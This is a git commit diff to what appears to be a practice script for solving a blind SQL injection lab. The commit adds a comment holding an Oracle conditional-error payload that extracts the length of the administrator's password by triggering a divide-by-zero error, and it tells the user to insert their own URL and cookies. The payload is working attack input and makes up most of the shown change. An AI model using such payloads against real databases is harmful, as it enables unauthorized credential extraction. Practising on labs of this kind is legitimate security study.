be121600d1f9297f75404ff2af6ad112fcdcfacc
Abdarhman mohamed <abdarhman1337@gmail.com>
2025-10-23 20:46:11 +0300

    Replace to your cookie,url
    Fix typo in comment and update SQL injection query.

--- SQLI_script/Blind SQL injection with conditional errors.py
+++ SQLI_script/Blind SQL injection with conditional errors.py
@@ -1,5 +1,9 @@
-# don't forget to replce for your [url,cookies]
+""" 
+1-don't forget to replce for your [url,cookies]
 
+2- the length of the password: 
+' || (SELECT CASE WHEN (LENGTH((SELECT password FROM users WHERE username='administrator' AND ROWNUM = 1)) = {TRY-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM DUAL) || '
+"""
 import requests
 import sys
 import urllib.parse
